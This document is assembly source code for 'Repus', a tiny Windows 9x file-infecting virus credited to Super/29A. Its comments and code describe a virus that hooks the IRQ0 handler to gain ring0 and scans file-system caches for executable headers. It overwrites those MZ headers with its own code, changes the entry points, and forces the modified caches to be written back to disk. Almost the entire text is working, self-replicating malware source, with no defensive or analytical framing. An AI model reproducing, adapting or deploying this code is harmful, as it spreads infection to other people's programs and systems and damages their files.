
;=============;
; Repus virus ;
;=============;

;Coded by Super/29A

;VirusSize = 128 bytes !!!


;This is the third member of the Repus family


;-When an infected file is executed the virus patches IRQ0 handler and waits
; for it to return control to virus in ring0
;-Once in ring0, the virus searches in all caches a valid MZheader to infect,
; modifying EntryPoint (in PEheader) so virus can get control on execution
;-It will infect no more than one MZheader at a time per file system
;-MZheader will be overwritten, however windows executes it with no problems
; (tested under win95,win98,winNT and Win2K)
;-When executing a non infected file that imports APIs from an infected DLL,
; virus will get control on DLL inicialization and infect more MZheaders


;-------------------------------------------------------------------

 .386p
 .model flat,STDCALL

 extrn ExitProcess : near
 extrn MessageBoxA : near

;-------------------------------------------------------------------

VirusSize = (VirusEnd - VirusStart)

VCache_Enum macro
 int 20h
 dw 0009h
 dw 048Bh
endm

;-------------------------------------------------------------------

.data

Title:
 db 'Super/29A presents...',0

Text:
 db 'Repus.'
 db '0' + (VirusSize/100) mod 10
 db '0' + (VirusSize/10) mod 10
 db '0' + (VirusSize/1) mod 10
 db 0

;-------------------------------------------------------------------


.code

;===================================================================

VirusStart:

   db 'M'   ; dec ebp

VirusEntryPoint:

   db 'Z'   ; pop edx

   push edx
   dec edx
   jns JumpHost   ; exit if we are running winNT

   mov ebx,0C0001100h   ; IRQ0 ring0 handler

   mov dl,0C3h

   xchg dl,[ebx]   ; hook IRQ0 to get ring0

Wait_IRQ0:

   cmp esp,edx
   jb Wait_IRQ0


;Now we are in ring0


   xchg dl,[ebx]

   lea edx,[eax+(InfectCache-VirusEntryPoint)]   ; EDX = infection routine

   fld qword ptr [eax+(Next_FSD-VirusEntryPoint)]   ; save VxD dinamic call

Next_FSD:

   VCache_Enum   ; enumerate all caches

   inc ah
   jnz Next_FSD   ; try next file system

   call ebx   ; return control to IRQ0 and return just after the CALL


;Now we are in ring3


JumpHost:

   jmp HostEntryPoint   ; return control to host

;-------------------------------------------------------------------

InfectCache:

   xor dl,dl   ; EDX = ImageBase

   mov edi,[esi+10h]   ; EDI = MZheader

   movzx ecx,byte ptr [edi+3Ch]

   cmp byte ptr [edi+ecx],'P'   ; check for PEheader
   jnz _ret

Offset3B:

   and eax,00000080h   ; EAX = 0

   xchg esi,edx   ; ESI = ImageBase
                  ; EDX = Cache Block Structure

   cmpsb   ; check for MZheader
   jnz _ret

   mov [esi-1+(Offset3B+1-VirusStart)],ecx   ; save offset of PEheader

   fst qword ptr [esi-1+(Next_FSD-VirusStart)]   ; restore VxD dinamic call

   inc eax   ; EAX = 1

   xchg eax,[edi-1+ecx+28h]   ; set virus EntryPoint

   sub eax,(JumpHost+5-VirusStart)

   jb _ret   ; jump if its already infected

   mov cl,(VirusSize-1)

   rep movsb   ; copy virus to MZheader

   mov [edi+(JumpHost+1-VirusEnd)],eax   ; fix jump to host


;Here we are gonna find the pointer to the pending cache writes


   mov ch,2
   lea eax,[ecx-0Ch]  ; EAX=1F4h   ;-D
   mov edi,[edx+0Ch]  ; EDI = VRP (Volume Resource Pointer)
   repnz scasd
   jnz _ret  ; not found  :-(

   ; EDI = offset in VRP which contains PendingList pointer

   cmp [edi],ecx   ; check if there are other pending cache writes
   ja _ret

   cmp [edi+30h],ah   ; only infect logical drives C,D,...
   jbe _ret


;Now we are gonna insert this cache in the pending cache writes


   or byte ptr [edx+32h],ah  ; set dirty bit

   mov [edx+1Ch],edx  ; set PendingList->Next
   mov [edx+20h],edx  ; set PendingList->Previous

   mov [edi],edx  ; set PendingList pointer

_ret:

   ret

   db '29A'

VirusEnd:

;===================================================================

 db 1000h dup(90h)

HostEntryPoint proc near

 push 0
 push offset Title
 push offset Text
 push 0
 call MessageBoxA

 push 0
 call ExitProcess

HostEntryPoint endp

;===================================================================

ends
end VirusEntryPoint
